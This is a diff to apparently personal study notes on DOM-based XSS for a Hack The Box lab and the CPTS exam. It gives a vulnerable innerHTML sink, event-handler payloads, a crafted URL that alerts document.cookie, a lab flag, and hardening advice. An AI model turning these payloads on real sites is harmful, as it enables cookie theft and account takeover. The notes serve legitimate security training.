@@ -4,9 +4,9 @@
 
 ## What Makes It DOM-Based
 
-Input never reaches the server. Client-side JavaScript reads it (from `location.hash`, `location.search`, `document.URL`, etc.) and writes it into the DOM. The injection happens entirely in the browser.
+Input never reaches the server. Client-side JavaScript reads it from sources like `location.hash`, `location.search`, or `document.URL`, then writes it into the Document Object Model (DOM). The injection happens entirely in the browser.
 
-Telltale sign: the URL uses `#` (fragment) instead of `?` (query string) for the parameter — fragments never leave the browser.
+Telltale sign: the URL uses `#` (fragment) instead of `?` (query string) for the parameter. Fragments never leave the browser.
 
 ```
 http://TARGET/#task=...    ← DOM XSS — # is client-side only
@@ -32,6 +32,7 @@ var task = document.URL.substring(pos + 5, document.URL.length);
 // Sink: innerHTML
 document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
 ```
+> This is the vulnerable pattern: user-controlled URL data flows directly into `innerHTML`. Any attacker-supplied HTML or script tags will be rendered by the browser.
 
 ---
 
@@ -47,8 +48,7 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 <body onload=alert(1)>
 <details open ontoggle=alert(1)>
 ```
-
-> `<img onerror>` is the go-to — empty `src` always fails to load → handler always fires.
+> Use these when `<script>` is blocked by `innerHTML`. The `<img onerror>` is the most reliable: an empty or broken `src` always fails to load, so the error handler always fires. Swap `alert(1)` for `alert(document.cookie)` to test real impact.
 
 ---
 
@@ -64,7 +64,7 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 
 ## Delivery
 
-Same as reflected — send the crafted URL to the victim. Since the fragment never hits the server, server-side logs won't show the payload (good for stealth, bad for incident response).
+Delivery works the same as reflected XSS — send the crafted URL to the victim. Since the fragment never hits the server, server-side logs will not show the payload. This is good for stealth but makes incident response harder.
 
 ```
 http://TARGET/#task=<img src='' onerror=alert(document.cookie)>
@@ -100,12 +100,14 @@ Decode the outer layer:
 echo "ZG9jdW1lbnQuY29va2llID0gYXRvYignU0ZSQ2UzQjFjak5zZVY5amJERXpiamRmTlRGa00zMD0nKTs=" | base64 -d
 # document.cookie = atob('SFRCe3B1cjNseV9jbDEzbjdfNTFkM30=');
 ```
+> Decodes a base64-encoded string and prints the result. Pipe to `base64 -d` again if the output is itself base64.
 
 Decode the inner cookie value:
 ```bash
 echo "SFRCe3B1cjNseV9jbDEzbjdfNTFkM30=" | base64 -d
 # HTB{pur3ly_cl13n7_51d3}
 ```
+> Same decode step. This reveals the cookie value that the lab's JavaScript set client-side.
 
 **Flag:** `HTB{pur3ly_cl13n7_51d3}`
 
@@ -115,8 +117,8 @@ echo "SFRCe3B1cjNseV9jbDEzbjdfNTFkM30=" | base64 -d
 
 ## Exam Notes
 
-- DOM XSS: fragment `#` source → DOM sink. No server involvement.
-- `<script>` blocked by `innerHTML` → use event-handler payloads (`<img onerror>`, `<svg onload>`)
-- Source/sink terminology shows up on the CPTS exam — memorize the common sinks (`innerHTML`, `document.write`, `eval`, jQuery `html()`)
-- DOM XSS evades server-side WAFs entirely — input never crosses the wire
-- Hardening: sanitize before sink (DOMPurify), or use `textContent`/`innerText` instead of `innerHTML`
+- DOM XSS uses a `#` fragment as the source and a DOM sink to execute. No server is involved.
+- `<script>` tags are blocked by `innerHTML`. Use event-handler payloads like `<img onerror>` or `<svg onload>` instead.
+- Source/sink terminology appears on the CPTS exam. Memorize the common sinks: `innerHTML`, `document.write`, `eval`, and jQuery's `html()`.
+- DOM XSS evades server-side Web Application Firewalls (WAFs) entirely. Input never crosses the wire.
+- Hardening: sanitize input before writing to the DOM using DOMPurify, or use `textContent`/`innerText` instead of `innerHTML`.
